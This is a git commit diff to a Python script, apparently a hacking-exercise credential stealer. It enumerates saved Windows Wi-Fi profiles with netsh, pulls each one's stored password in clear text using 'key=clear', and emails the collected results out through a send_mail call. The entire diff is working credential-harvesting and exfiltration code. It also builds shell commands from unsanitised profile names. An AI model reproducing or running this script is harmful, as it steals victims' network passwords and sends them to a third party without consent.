b6705bb820e8a4ebee965225607c44fe42e1c5fc
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-09-25 18:04:11 -0400

    Iterates through all networks and grabs data

--- execute_and_report.py
+++ execute_and_report.py
@@ -11,6 +11,13 @@ def send_mail(email, password, message):
 
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
-network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
-print(network_names)
-#send_mail("my_email@gmail.com", "abc123", result)
+network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+
+result=""
+for network_name in network_names_list:
+    print(network_name)
+    command = "netsh wlan show profile " + network_name + " key=clear"
+    current_result = subprocess.check_output(command, shell=True)
+    result = result + current_result
+
+send_mail("my_email@gmail.com", "abc123", result)
